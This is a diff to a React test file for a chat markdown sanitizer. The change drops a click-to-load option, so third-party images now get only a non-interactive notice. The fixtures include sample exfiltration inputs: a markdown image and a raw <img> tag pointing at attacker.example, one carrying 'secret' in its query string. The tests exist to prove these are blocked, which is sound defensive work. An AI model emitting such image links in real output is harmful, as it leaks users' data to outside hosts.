@@ -1,4 +1,4 @@
-import { fireEvent, render, screen } from '@testing-library/react';
+import { render } from '@testing-library/react';
 /**
  * RENDER-level sanitizer fixtures — the counterpart to
  * ./sanitize-invariant.test.ts, which asserts the SCHEMA.
@@ -167,21 +167,18 @@ describe('sanitizer — chat media loads only from the app', () => {
     });
   }
 
-  it('puts a click-to-load stand-in where a third-party image was', () => {
+  it('puts a notice where a third-party image was, and never loads it', () => {
     const { container } = render(
       <SimpleMarkdownRenderer content={'![Quarterly chart](https://attacker.example/c.png?d=secret)'} />,
     );
     expect(container.querySelector('img')).toBeNull();
-    const standIn = container.querySelector('[data-external-media="image"]');
-    expect(standIn?.textContent).toContain('Quarterly chart');
-    expect(standIn?.textContent).toContain('attacker.example');
-
-    fireEvent.click(screen.getByRole('button', { name: 'Load image from attacker.example' }));
-    expect(container.querySelector('[data-external-media]')).toBeNull();
-    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://attacker.example/c.png?d=secret');
+    const notice = container.querySelector('[data-external-media="image"]');
+    expect(notice?.textContent).toContain('Quarterly chart');
+    expect(notice?.textContent).toContain('attacker.example');
+    expect(notice?.querySelector('button, a, [tabindex]')).toBeNull();
   });
 
-  it('gives a raw <img> without alt text the same stand-in', () => {
+  it('gives a raw <img> without alt text the same notice', () => {
     const { container } = render(<SimpleMarkdownRenderer content={'<img src="//attacker.example/x.png">'} />);
     expect(container.querySelector('img')).toBeNull();
     expect(container.querySelector('[data-external-media="image"]')?.textContent).toContain('Image');
